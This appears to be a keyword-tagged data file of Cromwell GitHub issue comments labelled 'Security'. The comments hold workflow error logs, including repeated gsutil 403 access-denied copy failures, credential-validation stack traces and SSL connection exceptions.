/mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3327,access,access,3327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4581,access,access,4581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5835,access,access,5835,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7089,access,access,7089,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8343,access,access,8343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9597,access,access,9597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10851,access,access,10851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12105,access,access,12105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13359,access,access,13359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/\"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205, in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1221, in Get\n required)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoP",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044:1213,validat,validate,1213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044,1,['validat'],['validate']
Security,"`HASH_VALUE` in `CALL_CACHING_HASH` is `VARCHAR(255)`, so we shouldn't have this particular problem. But given that the Docker hashes we generate are functions of Docker image names and those seem to have the potential to be very long, we might want to think about an even larger field.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174:127,hash,hashes,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174,1,['hash'],['hashes']
Security,a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_asse,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1837,access,access,1837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"a:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:9341,validat,validateCredential,9341,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"a:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem(package.scala:26); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:18); at cromwell.backend.impl.jes.JesInitializationActor.<init>(JesInitializationActor.scala:43); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); ```. The two problem actors here are JesAsyncBackendJobExecutionActor and JesInitializationActor. JobPreparationActor also triggers a similar stack trace, but it's using the slow-actor-dispatcher so this doesn't adversely impact submissions. Moving JesAsyncBackendJobExecutionActor and JesInitializationActor to slow-actor-dispatcher as well enabled me to submit up to 50 workflows immediately (I didn't try any more beyond this). The auth / filesystem code was heavily reworked in #702 after 0.19_hotfix was branched. There's a known issue with GCS filesystems not being reused #813 and it looks like there could be another issue with validating credentials excessively.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:3049,validat,validating,3049,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['validat'],['validating']
Security,"ad.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at 